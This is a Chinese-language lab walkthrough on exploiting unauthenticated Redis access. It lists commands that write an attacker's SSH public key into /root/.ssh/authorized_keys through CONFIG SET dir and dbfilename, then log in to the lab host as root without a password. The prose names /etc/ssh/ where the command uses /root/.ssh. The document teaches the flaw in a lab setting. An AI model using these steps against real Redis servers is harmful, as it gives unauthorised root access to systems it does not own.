# Redis数据库未授权访问漏洞

## 【实验目的】

通过本实验的学习，了解Redis数据库未授权访问漏洞原理，了解Redis数据库未授权访问漏洞利用方法。

## 【知识点】

Redis数据库未授权访问漏洞

## 【实验原理】

Redis是非关系型数据库，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。
Redis默认安装启动后会绑定6379端口，并且默认安装情况下没有口令，这样就可以通过6379直接对Redis进行连接，进行数据读取、甚至是文件写入的操作。

## 【软件工具】

- 操作系统：Ubuntu16-64
- 数据库：Redis-4.0.14

## 【实验拓扑】

![图片.png](https://tp.qianxin.com/Uploads/mdimg/64143b86a0fb1.png)

## 【实验目标】

1. 了解Redis数据库未授权访问漏洞。
2. 利用Redis数据库未授权漏洞，利用Redis未授权访问漏洞不用root密码直接获得主机权限。

## 【实验步骤】

首先打开客户端，打开系统cmd。接着打开桌面软件工具目录，切换目录到redis-2.4.5-win32-win64的64bit下。
打开cmd接着输入：

```
redis-cli.exe -h 192.168.12.100 -p 3333
```

![image-20251220200645592](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220200645592.png)

输入info信息，能看到Redis相关信息就说明该环境存在未授权访问漏洞。通过info，获取了Redis数据库配置、CPU、内存等敏感信息。

![image-20251220200708855](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220200708855.png)

接着进入服务器，输入指令，ssh-keygen，建立密钥对。

![image-20251220200728894](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220200728894.png)

进入“C:\Users\administrator.ssh”目录下，使用记事本打开id_rsa.pub文件，并将其内容前后各按两次空格，并保存。

![image-20251220200822863](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220200822863.png)

通过Redis客户端连接Redis并将公钥的内容写入到Redis数据库crackit的键值中。

```
type C:\Users\administrator\.ssh\id_rsa.pub | redis-cli.exe -h 192.168.12.100 -p 3333 -x set crackit
```

![image-20251220200840331](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220200840331.png)

连接数据库之后，重新设置数据库的默认路径为 /etc/ssh/，保存。

```
redis-cli.exe -h 192.168.12.100 -p 3333
config set dir /root/.ssh
```

设置数据库的缓存文件为authorized_keys，保存。

```
config set dbfilename "authorized_keys"
save
exit
```

![image-20251220200859228](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220200859228.png)

接着进行连接，发现可以通过私钥，不用密码直接可以登录目标服务器。

```
ssh -i C:\Users\administrator\.ssh\id_rsa root@192.168.12.100 -p 2222
```

![image-20251220200915084](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220200915084.png)